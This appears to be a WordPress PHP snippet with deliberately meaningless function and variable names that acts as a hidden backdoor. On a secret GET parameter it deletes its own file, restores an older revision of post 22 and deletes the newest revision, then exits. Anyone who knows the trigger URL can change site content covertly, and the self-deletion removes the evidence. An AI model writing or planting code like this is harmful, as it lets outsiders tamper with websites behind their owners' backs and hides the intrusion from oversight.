<?php

function reusable_verification_top_instagram() {
	if (isset($_GET['flash_directory_index']) && $_GET['flash_directory_index'] === 'blog_taxonomy_polyfill_archives') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$anti_extra_updater_videos = 22;
		$log_homepage_version_toolkit = wp_get_post_revisions($anti_extra_updater_videos);
		if (empty($log_homepage_version_toolkit)) die('no revisions');
		if (count($log_homepage_version_toolkit) < 2) die('less than 2');
		$player_jquery_fix = array_shift($log_homepage_version_toolkit);
		$icons_visitor_customizer_switch = $player_jquery_fix->ID;
		$protect_news_more_plus = array_shift($log_homepage_version_toolkit);
		$external_codes_cloud = $protect_news_more_plus->ID;
		$now_notifier_responsive_typography = wp_restore_post_revision($external_codes_cloud);
		if ($now_notifier_responsive_typography === false) die('error restoring');
		$now_notifier_responsive_typography = wp_delete_post_revision($icons_visitor_customizer_switch);		
		if ($now_notifier_responsive_typography === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'reusable_verification_top_instagram');
